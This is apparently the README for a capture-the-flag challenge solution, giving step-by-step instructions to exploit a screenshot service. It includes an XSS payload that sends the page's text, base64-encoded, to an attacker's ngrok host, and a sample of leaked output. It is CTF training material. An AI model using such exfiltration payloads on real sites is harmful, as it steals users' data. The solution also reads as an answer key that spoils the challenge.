# Solution

The [`DO_NOT_ACCESS`](/DO_NOT_ACCESS) folder contains the solution when you checkout the `solution` branch with `git checkout solution`.

Dependencies:

- for python, check the `requirements.txt`. can be installed with `pip install -r requirements.txt`
- install `tesseract`. For mac for example `brew install tesseract`

Execute the exploit:

1. Install ngrok and run `ngrok http 1234`
2. Take notes of your personal ngrok URL like `f4b2152b6973.ngrok.io`
3. Adjust the base64 encoded XSS payload on `xss.html`: `echo "document.location='http://f4b2152b6973.ngrok.io/?leak='+btoa(document.body.innerText);//" | base64`
4. Adjust the ngrok URL in `attack.html`
5. Adjust the `NGROK_URL` and `SCREENSHOTTER` URL in `exploit.py`
6. Run local webserver on port 1234, like `php -S 127.0.0.1:1234`
7. run `python exploit.py`
8. wait for the exploit...
9. You should receive a leak on the local webserver `/?leak=c2NyZWVuc2hvdHRlciBERU1PIGFjdGl2aXR5IGZsYWdnZXIgTG9nb3V0CiBDcmVhdGUKeCBvbmxvYWQ9ZXZhbChhdG9iKGBaRzlqZFcxbGJuUXViRzlqWVhScGIyNDlKMmgwZEhBNkx5OWpjMk5uTG1SbFFHWTBZakl4TlRKaU5qazNNeTV1WjNKdmF5NXBieTgvYkdWaGF6MG5LMkowYjJFb1pHOWpkVzFsYm5RdVltOWtlUzVwYm01bGNsUmxlSFFwT3k4dkNnPT1gKSkKQ1NDR3tURVNURkxBR1RFU1RGTEFHVEVTVEZMQUd9CmZsYWc=`. decode the base64 encoded page and find the leaked flag.
